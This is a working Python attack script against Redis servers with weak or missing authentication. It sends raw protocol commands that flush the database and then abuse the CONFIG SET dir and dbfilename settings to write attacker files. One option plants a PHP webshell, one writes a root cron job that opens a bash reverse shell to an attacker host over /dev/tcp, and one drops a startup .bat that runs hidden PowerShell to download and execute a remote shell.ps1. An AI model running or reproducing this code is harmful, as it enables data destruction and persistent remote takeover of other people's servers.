from base64 import decode, encode, encodebytes
from encodings import utf_8
from pydoc import plain
from sys import argv
import socket

target_ip = "127.0.0.1"
target_port = 6379
password = '123456'

reverse_ip = '127.0.0.1'
reverse_port = 8888

task_plan = 'set x "\r\n\r\npowershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.230.133/shell.ps1\');xx.ps1\"\r\n\r\n" \n'

def file_send(ip,port,passwd):
    message0 = 'auth ' + passwd + ' \n'
    message0 = str.encode(message0)
    message1 = str.encode('flushall \n')
    message2 = str.encode('config set dir C:\\ \n')
    message3 = str.encode('config set dbfilename shell.php \n')
    message4 = str.encode("set 'webshell' '<?php phpinfo();?>' \n")
    message5 = str.encode('save \n')
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))

    s.send(message0)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message1)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message2)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    

    s.send(message3)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message4)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message5)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
def reverse_shell(ip,port,passwd,host,hport):
    flag = 0
    message0 = str.encode('flushall \n')
    message1 = str.encode('auth ' + passwd + ' \n')
    message21 = str.encode('config set dir /var/spool/cron/ \n')
    message22 = str.encode('config set dir /var/spool/cron/crontab \n')
    message23 = str.encode('config set dir /var/spool/cron/crontabs \n')
    message3 = str.encode('config set dbfilename root \n')
    message4 = str.encode('set shell "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/' + host + '/' + str(hport) + ' 0>&1\n\n" \n')
    message5 = str.encode('save \n')
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(message0)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    s.send(message1)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    s.send(message21)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    if '+OK' in res:
        flag = 1
    s.send(message22)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    if '+OK' in res:
        flag = 1
    s.send(message23)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    if '+OK' in res:
        flag = 1
    if flag == 0:
        print('no file or dicionary to write')
        exit(0)
    s.send(message3)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message4)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message5)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

def windows_attack(ip,port,passwd,plan):
    message0 = 'auth ' + passwd + ' \n'
    message0 = str.encode(message0)
    message1 = str.encode('flushall \n')
    message2 = str.encode('config set dir C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/ \n')
    message3 = str.encode('config set dbfilename 1.bat \n')
    message4 = str.encode(plan)
    message5 = str.encode('save \n')
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))

    s.send(message0)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message1)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message2)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    

    s.send(message3)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message4)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message5)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
if __name__ == "__main__":
    #reverse_shell_send(target_ip, target_port)
    print(task_plan)
    method = input('1.upload file\n2.reverse_shell\n3.Plan task(windows)\n')
    if method == '1':
        file_send(target_ip,target_port,password)
    elif method == '2':
        reverse_shell(target_ip,target_port,password,reverse_ip,reverse_port)
    elif method == '3':
        windows_attack(target_ip,target_port,password,task_plan)
